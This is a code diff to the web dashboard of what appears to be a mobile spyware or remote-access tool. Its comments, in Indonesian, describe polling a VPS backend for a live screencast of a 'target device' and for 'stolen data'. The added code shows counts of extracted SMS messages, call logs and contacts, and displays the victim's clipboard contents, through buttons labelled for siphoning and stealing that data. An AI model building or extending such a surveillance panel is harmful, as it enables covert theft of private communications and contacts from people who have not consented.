@@ -115,15 +115,21 @@
             box.appendChild(li);
             box.scrollTop = box.scrollHeight;
         }
-
+        // Fungsi utama untuk mengambil telemetri dan data asli dari VPS setiap 1.2 detik
         setInterval(() => {
+            // 1. Perbarui cuplikan visual screencast secara realtime
             document.getElementById('screencast-feed').src = '/api/get-latest-frame?' + Date.now();
+            
+            // 2. Tarik log dan data riil dari backend
             fetch('/api/get-telemetry-log')
                 .then(res => res.json())
                 .then(data => {
+                    // Update Status Spesifikasi Perangkat Target
                     if (data.details) {
                         document.getElementById('device-spec-info').innerText = data.details;
                     }
+                    
+                    // Update Baris Log Telemetri di Kotak Konsol
                     if (data.logs && data.logs.length > 0) {
                         let logBox = document.getElementById('log-list');
                         logBox.innerHTML = "";
@@ -132,6 +138,41 @@
                             li.innerText = msg;
                             logBox.appendChild(li);
                         });
+                    }
+
+                    // Update Data Hasil Sedotan (SMS, Kontak, Panggilan, dll) Langsung ke Tombol Visual
+                    if (data.stolen_data) {
+                        let sd = data.stolen_data;
+                        
+                        // Jika ada data SMS masuk, ubah teks tombolnya
+                        if (sd.sms && sd.sms.length > 0) {
+                            let smsBtn = document.querySelector("button[onclick*='sedot-sms']");
+                            if (smsBtn) smsBtn.innerHTML = `Ekstraksi Kotak Masuk SMS <span class="badge bg-danger">${sd.sms.length} Data</span>`;
+                        }
+                        
+                        // Jika ada data Riwayat Panggilan masuk
+                        if (sd.calls && sd.calls.length > 0) {
+                            let callBtn = document.querySelector("button[onclick*='sedot-calls']");
+                            if (callBtn) callBtn.innerHTML = `Unduh Riwayat Panggilan <span class="badge bg-danger">${sd.calls.length} Log</span>`;
+                        }
+
+                        // Jika ada data Kontak masuk
+                        if (sd.contacts && sd.contacts.length > 0) {
+                            let contactBtn = document.querySelector("button[onclick*='sedot-kontak']");
+                            if (contactBtn) contactBtn.innerHTML = `Kloning Daftar Kontak <span class="badge bg-danger">${sd.contacts.length} Kontak</span>`;
+                        }
+
+                        // Jika ada data Clipboard terbaru
+                        if (sd.clipboard && sd.clipboard !== "Belum ada data papan klip.") {
+                            let clipBtn = document.querySelector("button[onclick*='curi-clipboard']");
+                            if (clipBtn) clipBtn.innerHTML = `Papan Klip: "${sd.clipboard.substring(0, 15)}..."`;
+                        }
+
+                        // Jika ada info Baterai asli perangkat
+                        if (sd.battery && sd.battery !== "Unknown%") {
+                            let batBtn = document.querySelector("button[onclick*='info-baterai']");
+                            if (batBtn) batBtn.innerHTML = `Diagnostik Daya: ${sd.battery}`;
+                        }
                     }
                 }).catch(() => {});
         }, 1200);
